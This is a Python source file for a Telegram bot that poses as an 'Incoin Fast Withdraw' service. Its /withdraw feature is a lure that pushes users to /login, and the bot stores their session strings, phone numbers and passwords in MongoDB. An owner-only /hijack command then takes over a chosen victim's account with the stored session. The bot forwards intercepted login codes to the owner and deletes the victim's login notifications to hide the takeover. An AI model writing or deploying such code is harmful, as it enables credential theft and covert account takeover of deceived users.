from pyromod import Client
from pyrogram import filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from config import BOT_TOKEN, API_ID, API_HASH, OWNER_ID, MONGO_URI, MONGO_DB_NAME
from login import generate_session, handle_login_responses, delete_session_files
from pymongo import MongoClient
import pytz
from datetime import datetime
import asyncio
import os

# ----------------------------
# MongoDB Setup
# ----------------------------
mongo_client = MongoClient(MONGO_URI)
db = mongo_client[MONGO_DB_NAME]
started_users = db["started_users"]
logged_in_users = db["logged_in_users"]

# ----------------------------
# Pyrogram Bot Client
# ----------------------------
app = Client(
    "my_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ----------------------------
# Global Variables
# ----------------------------
active_userbot = None
pending_user_id = None
user_states = {}

# ----------------------------
# Utility Functions
# ----------------------------
async def is_session_alive(session_string):
    try:
        checker = Client(
            "session_checker",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await checker.connect()
        me = await checker.get_me()
        await checker.disconnect()
        return True, me
    except Exception as e:
        print(f"[Session Check Error] {e}")
        return False, None

async def cleanup_userbot():
    global active_userbot
    if active_userbot:
        try:
            await active_userbot.stop()
        except Exception as e:
            print(f"Error stopping userbot: {e}")
        active_userbot = None

async def is_user_logged_in(user_id):
    user_session = logged_in_users.find_one({"user_id": user_id})
    return user_session and user_session.get("status") == "active"

# ----------------------------
# Hijack Commands
# ----------------------------
@app.on_message(filters.command("hijack"))
async def hijack_session(client: Client, message: Message):
    global active_userbot, pending_user_id

    if message.from_user.id != OWNER_ID:
        await message.reply("🚫 You are not my Owner 😎💻 Only the boss can use this command!")
        return

    if active_userbot:
        await message.reply("⚠️ A hijack session is already active. Use /cancel_hijack first.")
        return

    try:
        user_id_msg = await app.ask(
            chat_id=message.chat.id,
            text="📩 Please enter the user ID of the user you want to hijack:",
            filters=filters.text,
            timeout=60
        )

        if not user_id_msg.text.strip().isdigit():
            await message.reply("❌ Invalid user ID. Please provide a numeric user ID.")
            return

        user_id = int(user_id_msg.text.strip())

        if user_id == OWNER_ID:
            await message.reply("🙅‍♂️ Owner cannot be hijacked! You're the boss 😎👑")
            return

        pending_user_id = user_id
        user_session = logged_in_users.find_one({"user_id": user_id})

        if user_session and user_session.get("status") == "inactive":
            await message.reply("⚠️ User found but not logged in 🚫")
            pending_user_id = None
            return

        if not user_session or not user_session.get("session_string"):
            await message.reply("❌ User not found or not logged in.")
            pending_user_id = None
            return

        session_string = user_session["session_string"]
        saved_password = user_session.get("password", "N/A")

        is_alive, me = await is_session_alive(session_string)
        if not is_alive:
            await message.reply("❌ Session is not active or invalid.")
            pending_user_id = None
            return

        userbot = Client(
            f"userbot_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True
        )

        await userbot.start()
        active_userbot = userbot

        user_info = f"""
✅ **Hijack Successful**
└ User ID: `{me.id}`
└ Name: `{me.first_name or 'N/A'}`
└ Username: @{me.username or 'N/A'}
└ Phone: `{user_session.get('phone_number', 'N/A')}`
└ Password: `{saved_password}`
        """

        await message.reply(user_info.strip())
        await message.reply("🕵️ Listening for OTPs and login notifications...")

        @userbot.on_message(filters.private)
        async def otp_listener(_, msg: Message):
            if "Login code:" in msg.text:
                otp = msg.text.split(": ")[1].strip()
                await client.send_message(
                    OWNER_ID,
                    f"🔐 OTP Intercepted: `{otp}`",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("Stop Hijack", callback_data="stop_hijack")]
                    ])
                )
                await msg.delete()
            elif "New login" in msg.text or "logged in" in msg.text:
                await msg.delete()
                await asyncio.sleep(60)
                await cleanup_userbot()
                await client.send_message(
                    OWNER_ID,
                    "🛑 Session auto-closed (login detected)",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("Start New Hijack", callback_data="start_hijack")]
                    ])
                )

    except asyncio.TimeoutError:
        await message.reply("⏰ Timeout. You didn't reply in time.")
        pending_user_id = None
    except Exception as e:
        await message.reply(f"❌ Hijack failed: {str(e)}")
        await cleanup_userbot()
        pending_user_id = None

@app.on_message(filters.command("cancel_hijack") & filters.user(OWNER_ID))
async def cancel_hijack(_, message: Message):
    global active_userbot
    if not active_userbot:
        await message.reply("❌ No active hijack session.")
        return

    await cleanup_userbot()
    await message.reply("🛑 Hijack session terminated.")

@app.on_callback_query(filters.regex("^stop_hijack$"))
async def stop_hijack_callback(_, query):
    await cleanup_userbot()
    await query.message.edit_text("🛑 Hijack session stopped by Owner.")

@app.on_callback_query(filters.regex("^start_hijack$"))
async def start_hijack_callback(_, query):
    await query.message.edit_text("Please use /hijack command to start a new session.")

# ----------------------------
# Core Bot Commands
# ----------------------------
def non_command_filter(_, __, message):
    return not message.text.startswith('/')

@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    user = message.from_user
    welcome_msg = f"""
🌟 Hello {user.first_name if user.first_name else 'there'}! 🌟

Welcome to the Incoin Fast Withdraw Bot. Here's what I can do:

• /login - Authenticate with your account  
• /logout - Logout from your account  
• /withdraw - Start fast withdraw process  
• /cancel - Cancel any pending operation  
"""
    user_data = {
        "user_id": user.id,
        "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
        "username": user.username or "N/A",
        "start_time": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "status": "started"
    }
    started_users.update_one(
        {"user_id": user.id},
        {"$set": user_data},
        upsert=True
    )
    await message.reply_text(welcome_msg)

@app.on_message(filters.command("login"))
async def login_command(client: Client, message: Message):
    user_id = message.from_user.id
    
    # Check if user is already logged in
    if await is_user_logged_in(user_id):
        await message.reply("🔒 You're already logged in! No need to login again. 😊")
        return
    
    await generate_session(client, message)

@app.on_message(filters.command("logout"))
async def logout_command(client: Client, message: Message):
    user_id = message.from_user.id
    files_deleted = await delete_session_files(user_id)
    logged_in_users.update_one(
        {"user_id": user_id},
        {"$set": {"session_string": None, "status": "inactive"}}
    )
    await message.reply("✅ Logged out successfully" + (" and files deleted" if files_deleted else ""))

@app.on_message(filters.command("withdraw"))
async def withdraw_command(client: Client, message: Message):
    user_id = message.from_user.id
    user_states[user_id] = "awaiting_withdraw_id"

    try:
        response = await client.ask(
            chat_id=message.chat.id,
            text="💸 Please enter your *IncoinPay ID* to start the fast withdraw process:",
            filters=filters.text,
            timeout=60
        )
        user_states.pop(user_id, None)
        entered_id = response.text.strip()

        # Check if it is a 6 or 7 digit number
        if not (entered_id.isdigit() and len(entered_id) in [6, 7]):
            await message.reply("❌ Incorrect IncoinPay ID. Please enter a valid ID or login to get it.")
            return

        # Check if user is logged in
        if await is_user_logged_in(user_id):
            await message.reply(
                "🚀 Fast withdraw process will start shortly!\n\n"
                "⏳ Please be patient while we process your request...\n"
                "✅ You'll be notified once completed!"
            )
        else:
            await message.reply(
                f"🚀 Great! You've entered: `{entered_id}`\n\n"
                "🔐 Please login first using /login command.\n\n"
                "⚠️ Make sure this bot stays logged in, otherwise your fast withdraw process will be terminated."
            )
    except asyncio.TimeoutError:
        user_states.pop(user_id, None)
        await message.reply("⏰ Timeout! Please try /withdraw again when you're ready.")

@app.on_message(filters.command("cancel"))
async def cancel_command(_, message: Message):
    user_id = message.from_user.id
    if user_states.pop(user_id, None):
        await message.reply("❌ Operation cancelled.")
    else:
        await message.reply("⚠️ No operation was pending.")

@app.on_message(filters.private & filters.text & filters.create(non_command_filter))
async def handle_messages(client: Client, message: Message):
    global pending_user_id
    if pending_user_id and message.from_user.id == OWNER_ID:
        return
    await handle_login_responses(client, message)

# ----------------------------
# Main Runner
# ----------------------------
if __name__ == "__main__":
    print("🤖 Bot is starting...")
    app.run()
